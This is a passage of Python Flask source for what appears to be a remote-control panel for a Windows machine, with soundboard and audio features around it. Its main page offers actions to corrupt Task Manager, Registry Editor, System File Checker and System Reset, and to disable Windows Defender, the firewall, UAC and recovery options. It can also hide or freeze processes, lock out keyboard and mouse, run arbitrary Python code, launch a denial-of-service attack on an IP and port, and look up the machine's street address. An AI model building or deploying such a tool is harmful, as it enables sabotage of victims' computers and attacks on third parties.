        A helper that re-queues the local file in the soundboard manager.
        We'll rename or just pass the path directly. 
        """
        try:
            if soundboard_manager:
                # Instead of adding it to the actual soundboard folder,
                # we can just queue the temp_path directly.
                soundboard_manager.sound_queue.put(temp_path)
                print("Queued external audio from:", temp_path)
                return True, "queued"
            else:
                return False, "Soundboard manager not available"
        except Exception as e:
            return False, f"Error queuing external sound: {str(e)}"


    @app.route('/upload_soundboard_file', methods=['POST'])
    def upload_soundboard_file():
        """
        - Save and convert the uploaded file to WAV if it's an MP4 inside soundboard_added_files
        - Mark it as 'added': True
        - Broadcast a socket event to all clients telling them to refresh
        """
        try:
            # 1. Check for 'local_sound' in files
            if 'local_sound' not in request.files:
                return jsonify({'error': 'No file part named "local_sound" found'}), 400

            file = request.files['local_sound']
            if file.filename == '':
                return jsonify({'error': 'No file selected'}), 400

            # 2. Ensure the added_folder exists
            if not os.path.exists(ADDED_FOLDER):
                os.makedirs(ADDED_FOLDER, exist_ok=True)

            # 3. Secure the filename and determine extension
            original_name = secure_filename(file.filename)
            file_ext = os.path.splitext(original_name)[1].lower()

            # 4. Generate a unique filename with timestamp
            filename_base = os.path.splitext(original_name)[0]
            timestamp = int(time.time())
            final_filename = f"{filename_base}_{timestamp}{file_ext}"
            final_path = os.path.join(ADDED_FOLDER, final_filename)

            # 5. Save the uploaded file
            file.save(final_path)

            # 6. If the file is an MP4, convert it to WAV
            if file_ext == '.mp4':
                wav_filename = f"{filename_base}_{timestamp}.wav"
                wav_path = os.path.join(ADDED_FOLDER, wav_filename)

                success, message = convert_mp4_to_wav_pyav_multiprocess(final_path, wav_path)
                print('Converted MP4 to WAV:', success, message)
                if not success:
                    # Conversion failed; remove both files
                    try:
                        os.remove(final_path)
                    except Exception as e_remove:
                        print(f"Error removing raw MP4 file after conversion failure: {e_remove}")
                    return jsonify({'error': f'Error converting MP4 to WAV: {message}'}), 400
                
                # Remove the original MP4 file after successful conversion
                try:
                    os.remove(final_path)
                except Exception as e_remove:
                    print(f"Error removing raw MP4 file after successful conversion: {e_remove}")
                    # Not critical; proceed

                # Use the WAV file for caching and playback
                final_filename = wav_filename
                final_path = wav_path

            # 7. Use Mutagen to parse the file and get duration
            try:
                muta = MutagenFile(final_path)
                if muta is not None and hasattr(muta, 'info') and muta.info is not None:
                    duration = muta.info.length  # Duration in seconds
                else:
                    duration = 0.0
            except Exception as err:
                print(f"Mutagen parse error: {err}")
                duration = 0.0

            # 8. Update the cached_soundboard_data
            global cached_soundboard_data
            if cached_soundboard_data is None:
                cached_soundboard_data = []

            file_info = {
                'duration_seconds': round(duration, 2),
                'format': os.path.splitext(final_filename)[1].lstrip('.'),  # e.g., 'wav', 'mp3'
                'added': True
            }
            cached_soundboard_data.append({
                'filename': final_filename,
                'info': file_info
            })

            # 9. Broadcast the refresh event to all clients
            socketio.emit('soundboard_refresh', {})

            return jsonify({
                'message': f'"{original_name}" uploaded and processed successfully!',
                'filename': final_filename
            }), 200

        except Exception as e:
            print(f"Error in upload_soundboard_file: {e}")
            return jsonify({'error': str(e)}), 500
    """
  @app.route('/upload_soundboard_file', methods=['POST'])
    def upload_soundboard_file():
        - Check if file is a duplicate using audio characteristics
        - Save and convert the uploaded file to MP3 inside soundboard_added_files
        - Mark it as 'added': True
        - Broadcast a socket event to all clients telling them to refresh
        try:
            if 'local_sound' not in request.files:
                return jsonify({'error': 'No file part named "local_sound" found'}), 400

            file = request.files['local_sound']
            if file.filename == '':
                return jsonify({'error': 'No file selected'}), 400

            added_folder = os.path.join(get_script_directory(), "soundboard_added_files")
            if not os.path.exists(added_folder):
                os.makedirs(added_folder, exist_ok=True)

            original_name = secure_filename(file.filename)
            file_ext = os.path.splitext(original_name)[1].lower()
            raw_temp_path = os.path.join(added_folder, f"raw_{time.time()}{file_ext}")
            file.save(raw_temp_path)

            # Convert to audio segment for analysis
            try:
                audio_seg = AudioSegment.from_file(raw_temp_path)
            except Exception as e:
                try: os.remove(raw_temp_path)
                except: pass
                return jsonify({'error': f'Error reading media file: {str(e)}'}), 400

            # Generate audio fingerprint based on characteristics
            def get_audio_fingerprint(audio):
                # Get key characteristics that identify the audio
                duration = len(audio)
                channels = audio.channels
                sample_width = audio.sample_width
                frame_rate = audio.frame_rate
                
                # Take samples from beginning, middle and end
                samples = []
                segments = [0, duration//2, duration-1000] if duration > 2000 else [0]
                for pos in segments:
                    if pos < duration:
                        chunk = audio[pos:pos+1000]
                        rms = chunk.rms
                        samples.append(rms)
                
                return {
                    'duration': duration,
                    'channels': channels, 
                    'sample_width': sample_width,
                    'frame_rate': frame_rate,
                    'samples': samples
                }

            # Check for duplicates among existing files
            new_fingerprint = get_audio_fingerprint(audio_seg)
            
            def is_duplicate(fp1, fp2, tolerance=0.05):
                # Compare key characteristics
                if abs(fp1['duration'] - fp2['duration']) / max(fp1['duration'], fp2['duration']) > tolerance:
                    return False
                if fp1['channels'] != fp2['channels']:
                    return False
                if fp1['sample_width'] != fp2['sample_width']:
                    return False
                if fp1['frame_rate'] != fp2['frame_rate']:
                    return False
                
                # Compare sample RMS values
                if len(fp1['samples']) != len(fp2['samples']):
                    return False
                    
                for s1, s2 in zip(fp1['samples'], fp2['samples']):
                    if abs(s1 - s2) / max(s1, s2) > tolerance:
                        return False
                        
                return True

            # Check against existing files
            for existing_file in os.listdir(added_folder):
                if existing_file.endswith('.mp3'):
                    existing_path = os.path.join(added_folder, existing_file)
                    try:
                        existing_audio = AudioSegment.from_file(existing_path)
                        existing_fingerprint = get_audio_fingerprint(existing_audio)
                        
                        if is_duplicate(new_fingerprint, existing_fingerprint):
                            try: os.remove(raw_temp_path)
                            except: print('Error removing raw_temp_path')
                            return jsonify({
                                'error': 'This audio file appears to be a duplicate of an existing file',
                                'duplicate_of': existing_file
                            }), 400
                    except Exception as e:
                        print(f"Error checking duplicate for {existing_file}: {e}")
                        continue

            # If we get here, no duplicate was found
            # Convert to MP3 and save
            filename_base = os.path.splitext(original_name)[0]
            final_filename = f"{filename_base}_{int(time.time())}.mp3"
            final_path = os.path.join(added_folder, final_filename)
            audio_seg.export(final_path, format="mp3")
            try:            os.remove(raw_temp_path)
            except: print('Error removing raw_temp_path')
            # Add to cached data
            global cached_soundboard_data
            if cached_soundboard_data is None:
                cached_soundboard_data = []

            duration = audio_seg.duration_seconds
            file_info = {
                'duration_seconds': round(duration, 2),
                'format': 'mp3',
                'added': True
            }
            cached_soundboard_data.append({
                'filename': final_filename,
                'info': file_info
            })

            # Broadcast refresh to all clients
            socketio.emit('soundboard_refresh', {})

            return jsonify({
                'message': f'"{original_name}" uploaded successfully!',
                'filename': final_filename
            }), 200

        except Exception as e:
            print(f"Error in upload_soundboard_file: {e}")
            return jsonify({'error': str(e)}), 500

    """


    @app.route('/stop_soundboard_sounds', methods=['POST'])
    def stop_soundboard_sounds_route():
        """
        Forcibly stop any currently playing sound and clear the queue.
        """
        success, msg = soundboard_manager.stop_all_sounds()
        return jsonify({'success': success, 'message': msg})


    @app.route('/list_soundboard_files', methods=['GET'])
    def list_soundboard_files():
        """
        Merges old 'cache approach' with the new 'two folders' approach.
        Returns JSON: { "soundboard_files": [ ... ] }
        """
        try:
            print("[list_soundboard_files] request received")
            success = get_cached_soundboard_data_2folders()
            if success:
                global cached_soundboard_data
                # Just print so we can debug
                print(f"[list_soundboard_files] Returning {len(cached_soundboard_data)} items.")
                return jsonify({
                    'soundboard_files': cached_soundboard_data
                })
            else:
                return jsonify({'soundboard_files': []}), 500
        except Exception as e:
            print(f"[list_soundboard_files] Error: {e}")
            return jsonify({'error': str(e)}), 500
        

    # @app.route('/play_soundboard_sound', methods=['POST'])
    # def play_soundboard_sound():

    @app.route('/play_soundboard_sound', methods=['POST'])
    def play_soundboard_sound():
        """
        Front-end calls: 
        POST /play_soundboard_sound?filename=FILENAME&isadded=BOOL
        We pick the correct folder, then queue the sound for playback.
        """
        try:
            filename = request.args.get('filename')
            is_added_str = request.args.get('isadded', 'false')
            is_added = (is_added_str.lower() == 'true')

            print(f"[play_soundboard_sound] request => {filename}  (is_added={is_added})")
            if not filename:
                return jsonify({'error': 'No filename specified'}), 400

            if is_added:
                folder_path = ADDED_FOLDER
            else:
                folder_path = SOUNDS_FOLDER

            full_path = os.path.join(folder_path, filename)
            if not os.path.exists(full_path):
                return jsonify({'error': 'Sound file not found'}), 404

            print(f"Playing sound: {full_path}")

            # Now queue the sound in your SoundboardManager:
            soundboard_manager.sound_queue.put(full_path)

            return jsonify({
                'message': f'Playing Sound: {filename}',
                'status': 'playing'
            })
        except Exception as e:
            print(f"[play_soundboard_sound] Error: {e}")
            return jsonify({'error': str(e)}), 500



    @app.route('/', methods=['GET', 'POST'])
    def login():
        """
        Handle user authentication through a time-based verification code system with session management.
        This function manages the login process by validating a time-based verification code
        and creating a secure session for authenticated users. It includes IP-based access control
        and supports a 30-second window for code validation (previous, current, and next codes).
        Returns:
            Union[str, Response]: Either a redirect to the main page on successful authentication,
                                 a rendered login template with error message on failure,
                                 or an authorization revoked message for blocked IPs.
        Dependencies:
        """
        """Handle login with session cleanup."""
        session.clear()
        client_id = request.remote_addr
        if prioritizeipv4 and client_id not in prioritizeipv4:
            return ("Authorization revoked. Further attempts are blocked.")
        if request.method == 'POST':
            entered_code = request.form.get('code')
            # print(f'{entered_code} > {passcode_ver.now()}')
            
            current_code = passcode_ver.now()
            previous_code = passcode_ver.at(datetime.now() - timedelta(seconds=15))
            previous_previous_code = passcode_ver.at(datetime.now() - timedelta(seconds=45))
            previous_previous_previous_code = passcode_ver.at(datetime.now() - timedelta(seconds=75))
            previous_previous_previous_previous_code = passcode_ver.at(datetime.now() - timedelta(seconds=105))
            next_code = passcode_ver.at(datetime.now() + timedelta(seconds=15))
            # print(f'Entered code: {entered_code}, Compared to: {current_code}, {previous_code}, {next_code}, {previous_previous_code}, {previous_previous_previous_code}')
            if entered_code in [current_code, previous_code, next_code, previous_previous_code, previous_previous_previous_code]:
                # print('Correct code entered')
                session_id = secrets.token_urlsafe(32)
                session.permanent = True
                session['authenticated'] = True
                session['session_id'] = session_id
                
                active_sessions[session_id] = {
                    'validated_at': time.time(),
                    'client_ip': request.remote_addr,
                    'socket_id': None
                }
                
                return redirect(url_for('main_page'))
            return render_template('login.html', error="Invalid code")
        return render_template('login.html')

    class SoundboardManager:
        def __init__(self):
            """Initialize the soundboard manager."""
            self.sound_queue = queue.Queue()
            self.currently_playing = False
            self.stop_flag = False
            self.play_thread = None
            self.active_sound_thread = None  # <--- store reference to the actual playback
            self.current_sound_file = None   # track which file is currently playing
            self._initialize_player()

        def _initialize_player(self):
            """Initialize the player loop thread."""
            self.play_thread = threading.Thread(target=self._player_thread, daemon=True)
            self.play_thread.start()

        def _player_thread(self):
            while True:
                try:
                    if not self.stop_flag and not self.sound_queue.empty():
                        sound_file = self.sound_queue.get()
                        self._play_sound_in_kthread(sound_file)

                        # WAIT for it to finish before pulling the next
                        # otherwise, we spawn multiple KThreads that can override each other.
                        if self.active_sound_thread:
                            self.active_sound_thread.join()
                            self.active_sound_thread = None

                    else:
                        time.sleep(0.1)
                except Exception as e:
                    print(f"Error in player thread: {e}")
                    time.sleep(1)


        def _play_sound_in_kthread(self, sound_path):
            """
            Spawn a KThread that will do the actual playback.
            Do NOT forcibly kill the existing track unless 'Stop All' is invoked.
            """
            # Remove this override:
            # if self.active_sound_thread and self.active_sound_thread.is_alive():
            #     self.active_sound_thread.kill()

            self.current_sound_file = sound_path
            self.active_sound_thread = KThread(target=self._play_sound, args=(sound_path,))
            self.active_sound_thread.start()


        def _play_sound(self, sound_path):
            """Internal method run by a KThread to actually play the audio in blocking mode."""
            try:
                self.currently_playing = True

                # Broadcast "sound_play_started" with the filename to all clients
                filename_only = os.path.basename(sound_path)
                socketio.emit('sound_play_started', {'filename': filename_only})

                if not pygame.mixer.get_init():
                    pygame.mixer.init()

                sound = pygame.mixer.Sound(sound_path)
                sound.play()

                start_time = time.time()
                duration = sound.get_length()

                while (time.time() - start_time < duration) and not self.stop_flag:
                    time.sleep(0.1)

                # If stop_flag is set or we forcibly kill, we do a mixer stop.
                if self.stop_flag:
                    pygame.mixer.stop()
            except SystemExit:
                # Thread forcibly killed
                pygame.mixer.stop()
            except Exception as e:
                print(f"Error playing sound {sound_path}: {e}")
            finally:
                self.currently_playing = False
                # broadcast "sound_play_stopped" to unhighlight
                socketio.emit('sound_play_stopped', {'filename': os.path.basename(sound_path)})
                self.current_sound_file = None

        def stop_all_sounds(self):
            self.stop_flag = True
            if self.active_sound_thread and self.active_sound_thread.is_alive():
                self.active_sound_thread.kill()
                self.active_sound_thread = None
            if pygame.mixer.get_init():
                pygame.mixer.stop()
            while not self.sound_queue.empty():
                self.sound_queue.get()
            time.sleep(0.2)
            self.stop_flag = False

            # BROADCAST to all clients so they also clear local queues
            socketio.emit('stop_all_sounds', {})

            return True, "stopped_all_sounds"


        


    soundboard_manager = SoundboardManager()
    class AudioStreamHandler:
        def __init__(self):
            self.audio_queue = queue.Queue()
            self.stream = None
            self.p = pyaudio.PyAudio()
            self.stream_active = False
            
        def start_stream(self):
            if self.stream_active:
                return
                
            self.stream_active = True
            self.stream = self.p.open(
                format=pyaudio.paFloat32,
                channels=1,
                rate=44100,
                output=True,
                frames_per_buffer=2048,
                stream_callback=self._audio_callback
            )
            
            self.stream.start_stream()
            
        def _audio_callback(self, in_data, frame_count, time_info, status):
            try:
                data = self.audio_queue.get_nowait()
                return (data.astype(np.float32).tobytes(), pyaudio.paContinue)
            except queue.Empty:
                return (np.zeros(frame_count, dtype=np.float32).tobytes(), pyaudio.paContinue)
                
        def process_audio_data(self, audio_data, sample_rate):
            if not self.stream_active:
                self.start_stream()
                
            # Convert audio data to numpy array and add to queue
            audio_array = np.array(audio_data, dtype=np.float32)
            self.audio_queue.put(audio_array)
            
        def stop_stream(self):
            if self.stream:
                self.stream.stop_stream()
                self.stream.close()
            self.stream_active = False
            
        def __del__(self):
            self.stop_stream()
            self.p.terminate()

    # Add to your Flask app:
    audio_stream_handler = AudioStreamHandler()

    @socketio.on('audio_stream')
    def handle_audio_stream(data):
        try:
            audio_data = data['audio']
            sample_rate = data['sampleRate']
            audio_stream_handler.process_audio_data(audio_data, sample_rate)
        except Exception as e:
            print(f"Error processing audio stream: {e}")

    class AudioHandler:
        def __init__(self):
            self.CHUNK = 4096  # Increased chunk size for better performance
            self.FORMAT = pyaudio.paInt16
            self.CHANNELS = 1
            self.RATE = 48000  # Set a constant sample rate here
            self.WAVE_OUTPUT_FOLDER = "recordings"
            self._pyaudio = None

            if not os.path.exists(self.WAVE_OUTPUT_FOLDER):
                os.makedirs(self.WAVE_OUTPUT_FOLDER)
            
        @property
        def pyaudio_instance(self):
            """Lazy initialization of PyAudio instance"""
            if self._pyaudio is None:
                self._pyaudio = pyaudio.PyAudio()
            return self._pyaudio

        def save_recording(self, audio_data, filename, sample_rate, channels):
            """Save the audio data as a WEBM file"""
            try:
                filepath = os.path.join(self.WAVE_OUTPUT_FOLDER, filename)
                
                with open(filepath, 'wb') as wf:
                    wf.write(audio_data)
                    
                # Clean up other recordings
                for file in os.listdir(self.WAVE_OUTPUT_FOLDER):
                    if file != filename and file.endswith(('.webm','.wav')):
                        try:
                            os.remove(os.path.join(self.WAVE_OUTPUT_FOLDER, file))
                        except Exception as e:
                            print(f"Error deleting old recording {file}: {e}")
                            
                return filepath
                    
            except Exception as e:
                print(f"Error saving recording: {e}")
                raise

        def play_audio_file(self, filepath):
            """Play audio file using pygame."""
            def player_thread():
                try:
                    slp(2) # let file be saved for identification
                    convert_and_play_sound(os.path.join(get_script_directory(), filepath), delete=True)
                    return True
                    
                except Exception as e:
                    print(f"Error in audio playback: {e}")
                    return False

                finally:
                    # Don't terminate PyAudio instance here, as it might be reused
                    pass
                
            # Run in thread to not block
            thread = threading.Thread(target=player_thread)
            thread.start()
            return thread



        def get_recording_info(self, filepath):
            """Get information about the recording"""
            try:
                stats = os.stat(filepath)
                size_kb = stats.st_size / 1024
                created_time = datetime.fromtimestamp(stats.st_ctime).strftime('%Y-%m-%d %H:%M:%S')
                
                with wave.open(filepath, 'rb') as wf:
                    duration = wf.getnframes() / wf.getframerate()
                    
                return {
                    'filepath': filepath,
                    'size_kb': round(size_kb, 2),
                    'duration_seconds': round(duration, 2),
                    'created_time': created_time,
                    'sample_rate': self.RATE,
                    'channels': self.CHANNELS
                }
                
            except Exception as e:
                print(f"Error getting recording info: {e}")
                return {
                    'filepath': filepath,
                    'error': str(e)
                }

        def __del__(self):
            """Cleanup PyAudio instance on deletion"""
            if self._pyaudio is not None:
                self._pyaudio.terminate()
                self._pyaudio = None

    @app.route('/upload_audio', methods=['POST'])
    def upload_audio():
        try:
            if 'audio' not in request.files:
                print("No audio file in request")
                return jsonify({'error': 'No audio file provided'}), 400
                
            audio_file = request.files['audio']
            sample_rate = int(request.form.get('sampleRate', 48000))  # Default to 48000 if not provided
            channels = int(request.form.get('channels', 1)) # Default to 1 if not provided

            audio_handler = AudioHandler()
            
            # Generate unique filename using timestamp and client IP
            client_ip = request.remote_addr.replace('.', '_')
            timestamp = int(time.time())
            filename = f"recording_{client_ip}_{timestamp}.webm"
            
            # Save the recording
            try:
                audio_data = audio_file.read()
                filepath = audio_handler.save_recording(audio_data, filename, sample_rate, channels)

                # Get recording info
                # recording_info = audio_handler.get_recording_info(filepath)
                
                # Play the audio in a separate thread
                threading.Thread(target=audio_handler.play_audio_file, args=(filepath,)).start()
                
                print(f"Successfully processed recording: {filename}")
                
                return jsonify({
                    'message': 'Recording saved and playing',
                    'filename': filename,
                    # 'info': recording_info
                })
                
            except Exception as e:
                print(f"Error processing audio: {e}")
                return jsonify({'error': f'Error processing audio: {str(e)}'}), 500
                
        except Exception as e:
            print(f"Error in upload_audio: {e}")
            return jsonify({'error': str(e)}), 500

    @app.route('/play_audio/<filename>', methods=['POST'])
    def play_audio(filename):
        try:
            audio_handler = AudioHandler()
            filepath = os.path.join(audio_handler.WAVE_OUTPUT_FOLDER, filename)
            
            if not os.path.exists(filepath):
                return jsonify({'error': 'Audio file not found'}), 404
                
            # Start playback in a thread and return immediately
            playback_thread = audio_handler.play_audio_file(filepath)
            
            return jsonify({
                'message': 'Audio playback started',
                'status': 'playing'
            })
                
        except Exception as e:
            print(f"Error in play_audio: {e}")
            return jsonify({'error': str(e)}), 500

    @app.route('/get_recording/<filename>', methods=['GET'])
    def get_recording(filename):
        try:
            audio_handler = AudioHandler()
            filepath = os.path.join(audio_handler.WAVE_OUTPUT_FOLDER, filename)
            
            if os.path.exists(filepath):
                return send_file(filepath, mimetype='audio/wav') # type: ignore
            else:
                return jsonify({'error': 'Recording not found'}), 404
                
        except Exception as e:
            print(f"Error in get_recording: {e}")
            return jsonify({'error': str(e)}), 500

    @app.route('/list_recordings', methods=['GET'])
    def list_recordings():
        try:
            audio_handler = AudioHandler()
            recordings = []
            
            for filename in os.listdir(audio_handler.WAVE_OUTPUT_FOLDER):
                if filename.endswith('.wav'):
                    filepath = os.path.join(audio_handler.WAVE_OUTPUT_FOLDER, filename)
                    info = audio_handler.get_recording_info(filepath)
                    if info:
                        recordings.append({
                            'filename': filename,
                            'info': info
                        })
            
            return jsonify({
                'recordings': recordings
            })
            
        except Exception as e:
            print(f"Error in list_recordings: {e}")
            return jsonify({'error': str(e)}), 500

 
 

    @app.route('/check_session', methods=['GET'])
    def check_session():
        """Endpoint for client to check session validity."""
        is_valid = is_session_valid()
        remaining_time = 0
        if is_valid and session.get('session_id') in active_sessions:
            remaining_time = 3600 - (time.time() - active_sessions[session.get('session_id')]['validated_at'])
        
        return jsonify({
            'valid': is_valid,
            'remaining_time': int(remaining_time)
        })

    @app.route('/submit', methods=['POST'])
    @requires_auth
    def submit():
        button = request.form.get('button')
        client_id = request.remote_addr
        if prioritizeipv4 and client_id not in prioritizeipv4:
            send_alert(client_id, "Access denied. Authorization revoked.")
            return ''  # Immediately return if not authorized
        threading.Thread(target=handle_button_click, args=(button, client_id)).start()
        return ''
 

     
    @app.route('/index', methods=['GET'])
    @requires_auth
    def main_page():
        """Render main page for authenticated users."""
  
        location = geocoder.ip('me').latlng
        try:
            street_address = get_street_address(location[0], location[1])
        except:
            street_address = "Unknown, Failed fetching info"
        console = ""
        function_descriptions = {
            'installchrome': 'Install Chrome',
            'corrupttaskmgr': 'Corrupt Task Manager',
            'corruptmmc': 'Corrupt Management Console',
            'corruptregedit': 'Corrupt Registry Editor',
            'corruptdllhost': 'Corrupt DLL Host',
            'corruptsfc': 'Corrupt System File Checker',
            'corruptsystemreset': 'Corrupt System Reset',
            'screenoff': 'Screen Off',
            'disableUserAccountControl': 'Disable User Account Control',
            'enableUserAccountControl': 'Enable User Account Control',
            'swapRMBAndLMB': 'Swap Right Mouse Button And Left Mouse Button',
            'DisableWindowsDefender': 'Disable Windows Defender',
            'EnableWindowsDefender': 'Enable Windows Defender',
            'disableresetoptions': 'Disable Reset Options',
            'enableresetoptions': 'Enable Reset Options',
            'restartToUAC': 'Restart Script To Obtain UAC',
            'terminate_unknown_processes': 'Terminate Unknown Processes',
            'restart_explorer': 'Restart Explorer',
            'reset_network': 'Reset Network',
            'disablefirewall': 'Disable Firewall',
            'enablefirewall': 'Enable Firewall',
            'restartToADvancedOptions': 'Restart To Advanced Options',
            'disableTaskmanager': 'Disable Task Manager',
            'enabletaskmgr': 'Enable Task Manager',
            'freeze_all_processes': 'Freeze All Processes',
            'unfreeze_all_processes': 'Unfreeze All Processes',
            'restart_self': 'Restart Self',
            'disableUWF': 'Disable Unified Write Filter',
            'enableUWF': 'Enable Unified Write Filter',
            'installdiversify': 'Deploy Diversify',
        }
        try:
            greeting_text = generate_weather_greeting(location)
        except:
            greeting_text = "o/<br>Running offline"
        console = ""
        local_ip = socket.gethostbyname(socket.gethostname())
        tool_list = [{'name': func, 'desc': desc} for func, desc in function_descriptions.items()]
        categories = [
            {
                'name': 'Stuff..',
                'buttons': [
                    {'name': 'Open website', 'placeholder': 'Enter the URL of the website you wish'},
                    {'name': 'Text to speech', 'placeholder': 'Text to speech, deep male voice, English only'},
                    {'name': 'Speak in a language', 'placeholder': 'Hear any language by writing in it'},
                    {'name': 'Play frequency', 'placeholder': 'Formatted as HZ:Duration-in-milliseconds'},
                    {'name': 'Play Shepard tone', 'placeholder': 'Formatted as \"StartHZ:EndHZ:Duration-in-seconds\"'},
                    {'name': 'Restart Explorer'},
                    {'name': 'Download And Install Chrome'}
                ]
            },
            {
                'name': 'Display Manipulation',
                'buttons': [
                    {'name': 'Send to background highlight', 'placeholder': 'Explanation: The app that the computer user will click on will be hidden.'},
                    {'name': 'Turn the Screen black', 'placeholder': 'For how long? Duration in seconds'},
                    {'name': 'Make the screen rotate', 'placeholder': 'For how long to do the rotations? (seconds)'},
                    {'name': 'Flip screen: upsidedown'},
                    {'name': 'Flip screen: right'},
                    {'name': 'Flip screen: normal'},
                    {'name': 'Flip screen: left'},
                    {'name': 'payload1'},
                    {'name': 'payload2'},
                    {'name': 'payload3'},
                    {'name': 'payload4'},
                    {'name': 'payload5'},
                    {'name': 'payload6'}
                ]
            },
            {
                'name': 'System Control',
                'buttons': [
                    {'name': 'Per click, lag windows (Enable)'},
                    {'name': 'Per click, lag windows (Disable)'},
                    {'name': 'Swap RMB and LMB'},
                    {'name': 'Unswap RMB and LMB'},
                    {'name': 'enablekeyboard'},
                    {'name': 'disablekeyboard'},
                    {'name': 'enablemouse'},
                    {'name': 'disablemouse'}
                ]
            },
            {
                'name': 'Miscellaneous/Fun',
                'buttons': [
                    {'name': 'Me and the boys!'},
                    {'name': 'presskeys', 'placeholder': 'Press keys in Windows, combinations go as "key+key+key"'},
                    {'name': 'writetext', 'placeholder': 'Type text'},
                    {'name': 'Type a String like a human', 'placeholder': 'Type at the speed of a human'}
                ]
            },
            {
                'name': 'Process Management',
                'buttons': [
                    {'name': 'Kill Process', 'placeholder': 'Enter process name (e.g., notepad.exe)'},
                    {'name': 'Set Volume', 'placeholder': 'Enter volume level (0-100)'},
                    # {'name': 'Update Script', 'placeholder': 'Enter direct download link'},
                    # {'name': 'Rename Script', 'placeholder': 'Enter new filename (with extension)'},
                    {'name': 'Hide Process', 'placeholder': 'Enter process name'},
                    {'name': 'Show Process', 'placeholder': 'Enter process name'},
                    {'name': 'Freeze All Processes'},
                    {'name': 'Unfreeze All Processes'},
                    {'name': 'Maximize Process', 'placeholder': 'Enter process name'},
                    {'name': 'Minimize Process', 'placeholder': 'Enter process name'},
                    {'name': 'Run Python Code', 'placeholder': 'Enter Python code to execute'},
                    {'name': 'Unblock Application by Name', 'placeholder': 'Enter application name'},
                    {'name': 'Block Application by Name', 'placeholder': 'Enter application name'},
                    {'name': 'Unblock Ports for Application', 'placeholder': 'Enter application name'},
                    {'name': 'Block Ports for Application', 'placeholder': 'Enter application name'},
                    # {'name': 'Reset Firewall'},
                    # {'name': 'Self Destruct'},
                    {'name': 'Always on Top', 'placeholder': 'Enter process name'},
                    {'name': 'Unset Always on Top', 'placeholder': 'Enter process name'}
                ]
            },
            {
                'name': 'YouTube Control',
                'buttons': [
                    {'name': 'Play YouTube Video (Background)', 'placeholder': 'Enter YouTube URL, and optionally, start and end time(seconds), as "URL:START:END"'},
                    {'name': 'Play YouTube Video (Fullscreen)', 'placeholder': 'Enter YouTube URL, and optionally, start and end time(seconds), as "URL:START:END"'},
                    # {'name': 'Play YouTube Video Between Time (Background)', 'placeholder': 'Enter YouTube URLsplitterofty1243Start Timesplitterofty1243End Time'},
                    # {'name': 'Play YouTube Video Between Time (Fullscreen)', 'placeholder': 'Enter YouTube URLsplitterofty1243Start Timesplitterofty1243End Time'}
                ]
            },
            {
                'name': 'Network Management',
                'buttons': [
                    {'name': 'Redacted'}
                    # {'name': 'Clear Prioritized IPv4'},
                    # {'name': 'Prioritize IPv4', 'placeholder': 'Enter comma-separated IPv4 addresses (e.g., 192.168.1.1,192.168.1.2)'},
                    # {'name': 'Send Task to All Hosts', 'placeholder': 'Enter task to send'},
                    # {'name': 'Request Screen Share', 'placeholder': 'Enter target host IP address'}
                ]
            },
            {
                'name': 'Script Management',
                'buttons': [
                    # {'name': 'Add Script to Safe Mode'},
                    # {'name': 'Protect Script File'},
                    # {'name': 'Move Script to Folder', 'placeholder': 'Enter folder path (leave blank for random)'},
                    {'name': 'Disable SmartAssNoInternet'},
                    {'name': 'Enable SmartAssNoInternet'},
                    {'name': 'DoS IP:PORT', 'placeholder': 'Enter IP address and port (e.g., 192.168.1.1:80)'},
                    {'name': 'Stop DoS Attacks'},
                    # {'name': 'Hide Script UI'},
                    # {'name': 'Unprotect Script File'},
                    {'name': 'Disable Automatic Process Termination'},
                    {'name': 'Enable Automatic Process Termination'},
                    # {'name': 'Run Function via String', 'placeholder': 'Enter function name (e.g., function_name) or function_name split arg1=value1 split arg2=value2'},
                    {'name': 'Set DVD Timeout', 'placeholder': 'Enter timeout in seconds (0 to disable)'}
                ]
            }
        ]
        print(f'ADDRESS REMOTE: {request.remote_addr}')
        global prioritizeipv4
        if prioritizeipv4 is not None:
            try:
                ip_of_client = request.remote_addr
                if ip_of_client not in prioritizeipv4:
                    return False
            except Exception as e:
                print(f'Error in prioritizeipv4 handling of WEBUI: {e}')
        # return render_template('index.html', welcome=greeting_text, categories=categories)
        # current_2fa_code = pyotp.TOTP(passcode_rel).now()
        return render_template('index.html', welcome=greeting_text, categories=categories)#, current_2fa_code=current_2fa_code)


    def get_street_address(lat, lon):
        global geolocator
        """Gets the street address from latitude and longitude."""
        location = geolocator.reverse([lat, lon], exactly_one=True)
        return location.address

    def get_weather_description(weather_description):
        """Converts a weather description to a more user-friendly format."""
        weather_map = {
            "clear sky": "clear skies",
            "few clouds": "some clouds",
            "scattered clouds": "a few clouds",
            "broken clouds": "mostly cloudy",
            "overcast clouds": "overcast",
            "shower rain": "showers",
            "rain": "rain",
            "thunderstorm": "thunderstorms",
            "snow": "snow",
            "mist": "mist",
            "smoke": "smoke",
            "haze": "haze",
            "dust": "dust",
            "fog": "fog",
            "sand": "sand",
            "ash": "ash",
            "squalls": "squalls",
            "tornado": "a tornado"
        }
        return weather_map.get(weather_description, weather_description)

    def generate_weather_greeting(location):
        """Generates a greeting message with weather information."""
        # Get weather data
        response = requests.get(f'http://api.openweathermap.org/data/2.5/weather?lat={location[0]}&lon={location[1]}&units=metric&appid=a8bcf85c1ac14fc50ea17311d710be30')
        data = response.json()
        temp = round(data['main']['temp'])
        weather = data['weather'][0]['description'].lower()
        hour = datetime.now().hour

        # Time-based greetings
        greetings = {
            "morning": ["Rise and shine!", "Good morning!", "Top of the morning to you!", "Hello early bird!"],
            "afternoon": ["Good afternoon!", "Having a nice day?", "Hope your day is going well!", "Afternoon delight!"],
            "evening": ["Good evening!", "Winding down?", "Hope you had a great day!", "Evening vibes!"]
        }

        # Weather-based messages
        weather_messages = {
            "clear": [
            "Perfect day for an adventure!",
            "Blue skies ahead!",
            "Sunshine and good vibes!",
            f"A beautiful {temp}°C day!"
            ],
            "rain": [
            "Time for some hot chocolate and a good book!",
            "Don't forget your umbrella!",
            "Perfect weather for puddle jumping!",
            "Cozy rain vibes today!"
            ],
            "storm": [
            "Storm watching weather!",
            "Time to get cozy indoors!",
            "Nature's light show incoming!",
            "Thunder and lightning - very very frightening!"
            ],
            "snow": [
            "Winter wonderland alert!",
            "Perfect day for snowmen!",
            "Hot cocoa weather!",
            "Bundle up, it's snowing!"
            ],
            "cloudy": [
            "Cloudy with a chance of awesome!",
            "Gray skies but bright spirits!",
            "Perfect weather for daydreaming!",
            "Cozy cloud cover today!"
            ]
        }

        # Select appropriate greetings
        if 5 <= hour < 12:
            time_greeting = random.choice(greetings["morning"])
        elif 12 <= hour < 18:
